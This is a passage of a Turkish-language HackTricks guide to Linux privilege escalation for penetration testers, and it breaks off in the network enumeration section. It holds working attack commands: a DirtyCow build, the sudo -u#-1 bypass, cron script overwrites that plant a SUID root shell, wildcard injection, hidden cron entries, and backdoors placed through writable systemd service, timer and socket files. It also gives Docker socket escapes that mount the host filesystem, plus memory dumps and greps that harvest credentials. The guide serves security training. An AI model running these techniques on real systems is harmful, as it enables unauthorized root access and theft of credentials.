# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Sistem Bilgisi

### İşletim Sistemi bilgisi

Çalışan işletim sistemi hakkında bilgi edinmeye başlayalım.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Eğer **`PATH` değişkeninin içindeki herhangi bir klasörde yazma izniniz varsa** bazı libraries veya binaries'i hijack edebilirsiniz:
```bash
echo $PATH
```
### Env bilgisi

Çevre değişkenlerinde ilginç bilgiler, parolalar veya API anahtarları var mı?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel sürümünü ve escalate privileges için kullanılabilecek herhangi bir exploit olup olmadığını kontrol et.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Güvenlik açığı olan kernel listesi ve bazı zaten **compiled exploits** şu adreslerde bulabilirsiniz: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Diğer bazı **compiled exploits** bulabileceğiniz siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Bu siteden tüm zafiyetli kernel sürümlerini çıkarmak için şunu yapabilirsiniz:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploit aramalarında yardımcı olabilecek araçlar:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim üzerinde çalıştırın, yalnızca kernel 2.x için exploitleri kontrol eder)

Her zaman **kernel sürümünü Google'da arayın**, belki kernel sürümünüz bazı kernel exploit'lerinde yazılıdır ve böylece bu exploit'in geçerli olduğundan emin olursunuz.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo sürümü

Şurada görünen savunmasız sudo sürümlerine göre:
```bash
searchsploit sudo
```
Bu grep'i kullanarak sudo sürümünün zafiyetli olup olmadığını kontrol edebilirsiniz.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Kaynak: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg imza doğrulaması başarısız

**smasher2 box of HTB**'yi, bu **vuln**'ün nasıl exploit edilebileceğine dair bir **örnek** için kontrol edin.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Daha fazla system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Olası savunmaları listeleyin

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Eğer bir docker container içindeyseniz, ondan kaçmayı deneyebilirsiniz:


{{#ref}}
docker-security/
{{#endref}}

## Drives

Kontrol edin **what is mounted and unmounted**, nerede ve neden. Eğer herhangi bir şey unmounted ise, onu mount etmeyi deneyebilir ve gizli bilgileri kontrol edebilirsiniz.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Yararlı yazılımlar

Kullanışlı binaries'leri listeleyin
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Ayrıca, **any compiler is installed** olup olmadığını kontrol edin. Bu, bazı kernel exploit'leri kullanmanız gerekirse faydalıdır; çünkü onları kullanacağınız makinede (veya benzer birinde) compile etmeniz önerilir.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Zafiyeti Olan Kurulu Yazılımlar

**yüklü paketlerin ve servislerin sürümlerini** kontrol edin. Belki eski bir Nagios sürümü (örneğin) vardır; bu, escalating privileges için exploited edilebilir…\
Daha şüpheli yüklü yazılımların sürümlerini manuel olarak kontrol etmeniz önerilir.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Makineye SSH erişiminiz varsa, içeride yüklü olan güncel olmayan ve zafiyetli yazılımları kontrol etmek için **openVAS**'ı da kullanabilirsiniz.

> [!NOTE] > _Bu komutların çoğunlukla işe yaramayan çok fazla bilgi göstereceğini unutmayın; bu nedenle yüklü yazılım sürümlerinin known exploits için savunmasız olup olmadığını kontrol edecek OpenVAS veya benzeri uygulamaların kullanılması önerilir_

## İşlemler

Hangi işlemlerin yürütüldüğüne bir göz atın ve herhangi bir işlemin **olması gerekenden daha fazla ayrıcalığa** sahip olup olmadığını kontrol edin (**hangi işlemler** — örneğin root tarafından çalıştırılan bir tomcat olabilir mi?).
```bash
ps aux
ps -ef
top -n 1
```
Her zaman [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md) olup olmadığını kontrol edin. **Linpeas** bu türleri process komut satırındaki `--inspect` parametresini kontrol ederek tespit eder.\
Ayrıca **processes binaries** üzerindeki ayrıcalıklarınızı kontrol edin; belki birini overwrite edebilirsiniz.

### Süreç izleme

Süreçleri izlemek için [**pspy**](https://github.com/DominicBreuker/pspy) gibi araçları kullanabilirsiniz. Bu, sıkça çalıştırılan veya belirli gereksinimler karşılandığında yürütülen zafiyetli süreçleri tespit etmek için çok faydalı olabilir.

### Süreç belleği

Bazı sunucu servisleri **credentials in clear text inside the memory** saklar.\
Normalde diğer kullanıcılara ait süreçlerin belleğini okumak için **root privileges** gerekir; bu yüzden bu genellikle zaten root olduğunuzda ve daha fazla kimlik bilgisi keşfetmek istediğinizde daha faydalıdır.\
Ancak, unutmayın ki **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Günümüzde çoğu makine **don't allow ptrace by default**; bu, ayrıcalıksız kullanıcınıza ait diğer süreçleri dump edemeyeceğiniz anlamına gelir.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

Örneğin bir FTP servisinin belleğine erişiminiz varsa Heap'i elde edip içindeki credentials'ları arayabilirsiniz.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Verilen bir işlem kimliği için, **maps o işlemin sanal adres alanı içinde belleğin nasıl eşlendiğini gösterir**; ayrıca **eşlenen her bölgenin izinlerini** gösterir. Bu **mem** pseudo dosyası **işlemin belleğini doğrudan açığa çıkarır**. **maps** dosyasından hangi **bellek bölgelerinin okunabilir** olduğunu ve bunların offsetlerini biliriz. Bu bilgiyi **mem dosyasında seek yapıp tüm okunabilir bölgeleri bir dosyaya dökmek için kullanırız**.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` sistemin **fiziksel** belleğine erişim sağlar, sanal belleğe değil. Kernel'in sanal adres uzayına /dev/kmem kullanılarak erişilebilir.\
Genellikle, `/dev/mem` yalnızca **root** ve **kmem** grubunca okunabilir.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump, Windows için Sysinternals araç paketindeki klasik ProcDump aracının Linux için yeniden tasarlanmış bir versiyonudur. İndirmek için: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Araçlar

Bir process memory'sini dump etmek için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Root gereksinimlerini manuel olarak kaldırabilir ve size ait olan process'i dumplayabilirsiniz
- Script A.5 şu kaynaktan [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root gereklidir)

### Credentials from Process Memory

#### Manuel örnek

If you find that the authenticator process is running:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
İşlemi dump edebilir (bir işlemin memory'sini dump etmenin farklı yollarını bulmak için önceki bölümlere bakın) ve memory içinde credentials arayabilirsiniz:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Bu araç [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) bellekten **clear text credentials** ve bazı **iyi bilinen dosyalardan** çalacaktır. Doğru çalışması için root ayrıcalıkları gereklidir.

| Özellik                                           | Süreç Adı            |
| ------------------------------------------------- | -------------------- |
| GDM şifresi (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Arama Regexleri/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

Herhangi bir scheduled job'ın zafiyeti olup olmadığını kontrol et. Belki root tarafından çalıştırılan bir script'ten faydalanabilirsin (wildcard vuln? root'un kullandığı dosyaları değiştirebilir misin? symlinks kullanmak? root'un kullandığı dizinde belirli dosyalar oluşturmak?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron yolu

Örneğin, _/etc/crontab_ içinde PATH'i bulabilirsiniz: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Dikkat: "user" kullanıcısının /home/user üzerinde yazma yetkisi olduğunu göz önünde bulundurun_)

Eğer bu crontab içinde root kullanıcısı PATH'i ayarlamadan bir komut veya script çalıştırmaya çalışıyorsa. Örneğin: _\* \* \* \* root overwrite.sh_\
Böylece, aşağıdakini kullanarak root shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron wildcard içeren bir script kullanımı (Wildcard Injection)

Eğer bir script root tarafından çalıştırılıyorsa ve bir komut içinde “**\***” varsa, bunu beklenmeyen şeyler (ör. privesc) yapmak için suistimal edebilirsiniz. Örnek:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Eğer wildcard şu tür bir yolun önünde bulunuyorsa** _**/some/path/\***_ **, bu zafiyetli değildir (hatta** _**./\***_ **de değildir).**

Daha fazla wildcard exploitation tricks için aşağıdaki sayfayı okuyun:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Cron script üzerine yazma ve symlink

Eğer root tarafından çalıştırılan bir cron script'i **değiştirebiliyorsanız**, çok kolay bir şekilde shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Eğer root tarafından çalıştırılan script, **tam erişiminizin olduğu bir directory** kullanıyorsa, o folder'ı silip **başka bir directory'ye symlink oluşturmak** ve böylece kendi kontrolünüzdeki bir scripti sunmak işe yarayabilir.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Sık kullanılan cron jobs

Süreçleri izleyerek her 1, 2 veya 5 dakikada bir çalıştırılan süreçleri tespit edebilirsiniz. Belki bundan faydalanıp escalate privileges elde edebilirsiniz.

Örneğin, **1 dakika boyunca her 0.1s'de bir izlemek**, **daha az çalıştırılan komutlara göre sıralamak** ve en çok çalıştırılmış komutları silmek için şöyle yapabilirsiniz:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ayrıca kullanabilirsiniz** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (bu, başlayan her süreci izler ve listeler).

### Görünmez cron jobs

Bir cronjob oluşturmak mümkündür: bir yorumdan sonra **carriage return koyarak** (newline karakteri olmadan), ve cron job çalışacaktır. Örnek (carriage return karakterine dikkat):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisler

### Yazılabilir _.service_ dosyaları

Herhangi bir `.service` dosyasını yazıp yazamayacağınızı kontrol edin; yazabiliyorsanız, **onu değiştirebilir** ve servis **başlatıldığında**, **yeniden başlatıldığında** veya **durdurulduğunda** **backdoor**'unuzun **çalıştırılmasını** sağlayabilirsiniz (makinenin yeniden başlatılmasını beklemeniz gerekebilir).\
Örneğin backdoor'unuzu .service dosyasına **`ExecStart=/tmp/script.sh`** ile oluşturun

### Yazılabilir servis ikili dosyaları

Unutmayın ki eğer servisler tarafından çalıştırılan **binary'ler üzerinde yazma iznine** sahipseniz, bunları backdoors ekleyecek şekilde değiştirebilirsiniz; böylece servisler yeniden çalıştırıldığında backdoors da çalıştırılır.

### systemd PATH - Göreli Yollar

systemd tarafından kullanılan **PATH**'i şu komutla görebilirsiniz:
```bash
systemctl show-environment
```
Eğer yolun herhangi bir klasörüne **yazabiliyorsanız** muhtemelen **escalate privileges** yapabilirsiniz. Hizmet yapılandırma dosyalarında kullanılan **göreli yollar** gibi şeyleri aramanız gerekiyor:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Sonra, yazma izniniz olan systemd PATH klasörünün içine, görece yol ikili dosyayla aynı ada sahip bir **çalıştırılabilir** oluşturun ve servis savunmasız eylemi (**Başlat**, **Durdur**, **Yeniden Yükle**) gerçekleştirmesi istendiğinde, **backdoor**'unuz çalıştırılacaktır (ayrıcalıksız kullanıcılar genelde servisleri başlatıp durduramazlar ama `sudo -l` kullanıp kullanamayacağınızı kontrol edin).

**Servisler hakkında daha fazla bilgi için `man systemd.service` komutunu kullanın.**

## **Zamanlayıcılar**

**Zamanlayıcılar** systemd birim dosyalarıdır; adları `**.timer**` ile biten ve `**.service**` dosyalarını veya olayları kontrol eden. **Zamanlayıcılar**, takvim zaman olayları ve monotonik zaman olayları için yerleşik desteğe sahip oldukları ve eşzamansız çalıştırılabildikleri için cron'a bir alternatif olarak kullanılabilir.

Tüm zamanlayıcıları şu komutla listeleyebilirsiniz:
```bash
systemctl list-timers --all
```
### Yazılabilir timer'lar

Eğer bir timer'ı değiştirebiliyorsanız, var olan systemd.unit birimlerinden bazılarını (örn. bir `.service` veya `.target`) çalıştırmasını sağlayabilirsiniz.
```bash
Unit=backdoor.service
```
Dokümantasyonda Unit'in ne olduğu şöyle açıklanır:

> Bu timer sona erdiğinde etkinleştirilecek Unit. Argüman, son eki ".timer" olmayan bir unit adıdır. Belirtilmezse, bu değer timer unit ile aynı ada sahip bir service'e varsayar; yalnızca son ek farklıdır. (Yukarıya bakın.) Etkinleştirilen unit adının ve timer unit adının son ek dışında aynı adla isimlendirilmesi önerilir.

Bu izni kötüye kullanmak için şunlara ihtiyacınız olur:

- Bazı systemd unit'leri (ör. `.service`) bulun; bunlar **yazılabilir bir binary çalıştırıyor**
- Bazı systemd unit'leri bulun; bunlar **göreli bir yol çalıştırıyor** ve siz **systemd PATH** üzerinde **yazma ayrıcalıklarına** sahipsiniz (o yürütülebilir dosyayı taklit etmek için)

**timer'lar hakkında daha fazlasını öğrenmek için `man systemd.timer`'a bakın.**

### **Timer'ı Etkinleştirme**

Bir timer'ı etkinleştirmek için root ayrıcalıklarına sahip olmanız ve şu komutu çalıştırmanız gerekir:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Dikkat: **timer**, `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` konumuna bir symlink oluşturarak **etkinleştirilir**

## Sockets

Unix Domain Sockets (UDS) istemci-sunucu modellerinde aynı veya farklı makinelerde **process communication** sağlar. Bilgisayarlar arası iletişim için standart Unix descriptor dosyalarını kullanırlar ve `.socket` dosyaları aracılığıyla yapılandırılırlar.

Sockets `.socket` dosyaları kullanılarak yapılandırılabilir.

**Soketler hakkında daha fazla bilgi için `man systemd.socket`.** Bu dosya içinde, yapılandırılabilecek birkaç ilginç parametre vardır:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır ancak özet olarak soketin **nerede dinleyeceğini göstermek** için kullanılır (AF_UNIX soket dosyasının yolu, dinlenecek IPv4/6 ve/veya port numarası, vb.)
- `Accept`: Bir boolean argüman alır. Eğer **true** ise, her gelen bağlantı için bir **service instance** başlatılır ve sadece bağlantı soketi ona geçirilir. Eğer **false** ise, tüm dinleme soketleri **başlatılan service unit'e geçirilir**, ve tüm bağlantılar için yalnızca bir service unit başlatılır. Bu değer, tek bir service unit'un tüm gelen trafiği koşulsuz olarak işlediği datagram soketleri ve FIFO'lar için yok sayılır. **Varsayılan false'dur**. Performans nedenleriyle, yeni daemon'ların yalnızca `Accept=no` için uygun şekilde yazılması önerilir.
- `ExecStartPre`, `ExecStartPost`: Bir veya daha fazla komut satırı alır; bunlar sırasıyla dinlenen **sockets**/FIFO'lar **oluşturulup** bağlanmadan **önce** veya **sonra** **çalıştırılır**. Komut satırının ilk tokeni mutlak bir dosya adı olmalıdır, ardından işlem için argümanlar gelir.
- `ExecStopPre`, `ExecStopPost`: Dinlenen **sockets**/FIFO'lar **kapatılıp** kaldırılmadan sırasıyla **önce** veya **sonra** **çalıştırılan** ek **komutlar**.
- `Service`: Gelen trafik üzerinde **etkinleştirilecek** **service** unit adını belirtir. Bu ayar yalnızca Accept=no olan socket'ler için izin verilir. Varsayılan olarak, soket ile aynı adı taşıyan (sonek değiştirilmiş olan) service'e ayarlanır. Çoğu durumda bu seçeneğin kullanılması gerekli değildir.

### Writable .socket files

Eğer bir **yazılabilir** `.socket` dosyası bulursanız, `[Socket]` bölümünün başına `ExecStartPre=/home/kali/sys/backdoor` gibi bir satır **ekleyebilirsiniz** ve backdoor socket oluşturulmadan önce çalıştırılacaktır. Bu nedenle, **muhtemelen makinenin yeniden başlatılmasını beklemeniz gerekecektir.**\
_Not: Sistemin o socket dosyası yapılandırmasını kullanıyor olması gerekir; aksi halde backdoor çalıştırılmaz_

### Writable sockets

Eğer herhangi bir **yazılabilir socket** tespit ederseniz (_şimdi burada config `.socket` dosyalarından değil, Unix Sockets'den bahsediyoruz_), o socket ile **iletişim kurabilir** ve belki bir zafiyeti istismar edebilirsiniz.

### Unix Sockets'leri Listeleme
```bash
netstat -a -p --unix
```
### Ham bağlantı
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**İstismar örneği:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

HTTP isteklerini dinleyen bazı **sockets listening for HTTP** bulunabilir (_I'm not talking about .socket files but the files acting as unix sockets_). Bunu şu şekilde kontrol edebilirsiniz:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Eğer soket bir **HTTP** isteğine **cevap veriyorsa**, onunla **iletişim kurabilir** ve belki de **bazı bir zafiyeti sömürebilirsiniz**.

### Yazılabilir Docker soketi

Docker soketi, genellikle `/var/run/docker.sock` konumunda bulunan, korunması gereken kritik bir dosyadır. Varsayılan olarak, `root` kullanıcısı ve `docker` grubunun üyeleri tarafından yazılabilir. Bu sokete yazma erişimine sahip olmak privilege escalation'a yol açabilir. Aşağıda bunun nasıl yapılabileceğinin ve Docker CLI mevcut değilse alternatif yöntemlerin bir dökümü var.

#### **Privilege Escalation with Docker CLI**

Eğer Docker soketine yazma erişiminiz varsa, aşağıdaki komutları kullanarak privilege escalation gerçekleştirebilirsiniz:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Bu komutlar, host'un dosya sistemine root düzeyinde erişim ile bir container çalıştırmanızı sağlar.

#### **Docker API'yi Doğrudan Kullanma**

Docker CLI mevcut olmadığında, Docker soketi yine Docker API ve `curl` komutları kullanılarak manipüle edilebilir.

1.  **List Docker Images:** Mevcut image'lerin listesini alın.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Host sisteminin root dizinini mount eden bir container oluşturmak için bir istek gönderin.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Yeni oluşturulan container'ı başlatın:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` kullanarak container'a bir bağlantı kurun; bu sayede içinde komut çalıştırabilirsiniz.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` bağlantısını kurduktan sonra, host'un dosya sistemine root düzeyinde erişim ile doğrudan container içinde komut çalıştırabilirsiniz.

### Diğerleri

Docker soketi üzerinde yazma izniniz varsa çünkü **`docker` grubunun içindesiniz**, [**ayrıca ayrıcalıkları yükseltmek için daha fazla yolunuz vardır**](interesting-groups-linux-pe/index.html#docker-group). Eğer [**docker API bir portta dinliyorsa onu da ele geçirebilirsiniz**](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Docker'dan kaçmak veya onu kötüye kullanarak ayrıcalıkları yükseltmek için **daha fazla yol** inceleyin:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) ayrıcalık yükseltme

Eğer **`ctr`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun çünkü **bunu ayrıcalıkları yükseltmek için kötüye kullanabilirsiniz**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** ayrıcalık yükseltme

Eğer **`runc`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun çünkü **bunu ayrıcalıkları yükseltmek için kötüye kullanabilirsiniz**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus, uygulamaların verimli şekilde etkileşimde bulunup veri paylaşmasını sağlayan gelişmiş bir **inter-Process Communication (IPC) system**'dir. Modern Linux sistemi göz önünde bulundurularak tasarlanmış olan D-Bus, farklı uygulama iletişim biçimleri için sağlam bir çerçeve sunar.

Sistem çok yönlüdür; süreçler arasındaki veri alışverişini geliştiren temel IPC'yi destekler ve bu, **enhanced UNIX domain sockets**'ı anımsatır. Ayrıca olayları veya sinyalleri yayınlamaya yardımcı olur ve sistem bileşenleri arasında sorunsuz entegrasyonu teşvik eder. Örneğin, Bluetooth daemon'undan gelen bir arama bildirim sinyali, bir müzik çalarını sessize aldırarak kullanıcı deneyimini iyileştirebilir. Ayrıca D-Bus, uzak nesne sistemini destekler; bu, uygulamalar arasında servis istekleri ve yöntem çağrılarını basitleştirerek geleneksel olarak karmaşık olan süreçleri kolaylaştırır.

D-Bus, mesaj izinlerini (metot çağrıları, sinyal yayımı vb.) eşleşen politika kurallarının kümülatif etkisine göre yöneten bir **allow/deny modeli** ile çalışır. Bu politikalar bus ile etkileşimleri belirler ve bu izinlerin kötüye kullanılması yoluyla ayrıcalık yükseltmeye olanak sağlayabilir.

Böyle bir politikanın bir örneği `/etc/dbus-1/system.d/wpa_supplicant.conf` içinde verilmiştir; bu örnek, root kullanıcısının `fi.w1.wpa_supplicant1`'e sahip olma, ona mesaj gönderme ve ondan mesaj alma izinlerini ayrıntılı olarak gösterir.

Belirtilmiş kullanıcı veya grup olmayan politikalar evrensel olarak uygulanır; "default" bağlam politikaları ise diğer belirli politikalar tarafından kapsanmayan tüm öğelere uygulanır.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus iletişimini nasıl enumerate edip exploit edeceğinizi burada öğrenin:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Ağ**

Ağı enumerate etmek ve makinenin konumunu belirlemek her zaman ilginçtir.

### Genel enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
